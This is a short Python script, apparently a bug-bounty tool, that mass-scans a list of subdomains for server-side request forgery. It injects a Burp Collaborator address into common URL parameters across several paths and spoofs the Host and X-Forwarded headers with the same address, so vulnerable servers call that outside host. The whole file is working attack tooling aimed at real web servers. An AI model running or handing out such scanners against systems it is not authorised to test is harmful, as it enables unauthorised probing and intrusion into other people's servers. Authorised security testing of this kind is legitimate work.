import requests
import urllib.parse

# -------- CONFIG --------
payload = "http://xss.burpcollaborator.net"  # Replace with your domain
subdomain_file = "rupp_subdomains.txt"
params_to_test = ["url", "uri", "target", "link", "path", "dest", "domain", "redirect"]
paths_to_try = ["/", "/api", "/fetch", "/proxy", "/wp-json/oembed/1.0/embed", "/endpoint"]
headers = {
    "User-Agent": "SSRFScanner",
    "Host": "xss.burpcollaborator.net",
    "X-Forwarded-Host": "xss.burpcollaborator.net",
    "X-Forwarded-For": "xss.burpcollaborator.net"
}
timeout = 10
# ------------------------

def scan_url(full_url):
    try:
        r = requests.get(full_url, headers=headers, timeout=timeout, allow_redirects=True)
        print(f"[✓] {full_url} | {r.status_code} | Length: {len(r.text)}")
    except Exception as e:
        print(f"[!] Error: {full_url} => {e}")

with open(subdomain_file, "r") as f:
    subdomains = [line.strip() for line in f if line.strip()]

print(f"[+] Loaded {len(subdomains)} subdomains from {subdomain_file}")
print("[+] Starting SSRF scan...")

for sub in subdomains:
    for path in paths_to_try:
        for param in params_to_test:
            target = f"https://{sub}{path}?{urllib.parse.urlencode({param: payload})}"
            scan_url(target)
